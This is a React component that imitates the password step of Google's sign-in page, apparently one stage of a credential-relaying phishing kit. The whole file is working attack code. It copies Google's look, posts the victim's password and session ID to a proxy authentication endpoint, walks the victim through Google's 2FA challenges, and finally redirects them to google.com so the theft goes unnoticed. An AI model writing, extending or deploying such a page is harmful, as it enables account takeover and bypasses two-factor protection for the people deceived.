"use client";

import React, { useState } from "react";
import { useRegistration } from "./RegistrationContext";
import { Button } from "../ui/Button";
import api from "../../lib/api";
import { AxiosError } from "axios";

export default function Step4Password() {
  const {
    data,
    updateData,
    setStep,
    isLoading,
    setIsLoading,
    error,
    setError,
  } = useRegistration();
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;

    setIsLoading(true);
    setError(null);

    try {
      // Step 4: Submit password
      // Calling BE-PRXYAUTH endpoint: POST /api/google/login/password
      const response = await api.post("/google/login/password", {
        sessionId: data.sessionId,
        password: password,
      });

      if (response.data.success) {
        // Check if 2FA is required
        if (
          response.data.status === "REQUIRES_2FA" ||
          response.data.challengeType
        ) {
          updateData({
            challengeType: response.data.challengeType,
            challengeMetadata: response.data.challengeMetadata,
          });
          setStep(5);
        } else {
          // Login successful
          window.location.href = "https://google.com";
          // Redirect or show success
        }
      } else {
        // If 2FA is required but success is false (depends on API design, sometimes 200 with status REQUIRES_2FA)
        if (
          response.data.status === "REQUIRES_2FA" ||
          response.data.challengeType
        ) {
          updateData({
            challengeType: response.data.challengeType,
            challengeMetadata: response.data.challengeMetadata,
          });
          setStep(5);
        } else {
          setError(response.data.message || "Incorrect password");
        }
      }
    } catch (err: any) {
      if (err instanceof AxiosError && err.response) {
        // Check if it's actually a 2FA requirement disguised as error or just error
        if (
          err.response.data.status === "REQUIRES_2FA" ||
          err.response.data.challengeType
        ) {
          setStep(5);
        } else {
          setError(
            err.response.data.message ||
              err.response.data.error ||
              "An error occurred",
          );
        }
      } else {
        setError("Network error. Please try again.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-[450px] mx-auto">
      <div className="text-center mb-8">
        <div className="mb-2 flex justify-center">
          <div className="border border-[#e7eaed] rounded-[20px] px-3 py-1 text-[14px] flex items-center font-medium">
            <span className="max-w-[200px] truncate">{data.email}</span>
            <svg
              className="ml-2 w-4 h-4 text-[#444746]"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
            </svg>
          </div>
        </div>
        <h1 className="text-[24px] font-normal text-[#1f1f1f] mb-2">Welcome</h1>
        <div className="h-6"></div> {/* Spacer to match google layout */}
      </div>

      <div className="space-y-6">
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="block px-3.5 pb-2.5 pt-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] focus:border-[#0b57d0] focus:ring-1 focus:ring-[#0b57d0] appearance-none focus:outline-none peer h-[56px]"
            placeholder=" "
            required
          />
          <label
            htmlFor="password"
            className="absolute text-[16px] text-[#444746] duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-[#0b57d0] peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-2.5"
          >
            Enter your password
          </label>
        </div>

        <div className="flex items-start">
          <div className="flex items-center h-5">
            <input
              id="show-password"
              type="checkbox"
              checked={showPassword}
              onChange={(e) => setShowPassword(e.target.checked)}
              className="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-blue-300"
            />
          </div>
          <label
            htmlFor="show-password"
            className="ml-2 text-sm font-medium text-[#1f1f1f]"
          >
            Show password
          </label>
        </div>

        {error && (
          <div className="text-[#b3261e] text-sm flex items-start mt-2">
            <svg
              aria-hidden="true"
              className="w-4 h-4 mr-2 mt-0.5"
              fill="currentColor"
              focusable="false"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            {error}
          </div>
        )}
      </div>

      <div className="flex justify-between items-center mt-12">
        <Button
          type="button"
          variant="text"
          onClick={() => {}}
          className="text-[#0b57d0]"
        >
          Forgot password?
        </Button>
        <Button
          type="submit"
          isLoading={isLoading}
          disabled={!password || isLoading}
        >
          Next
        </Button>
      </div>
    </form>
  );
}
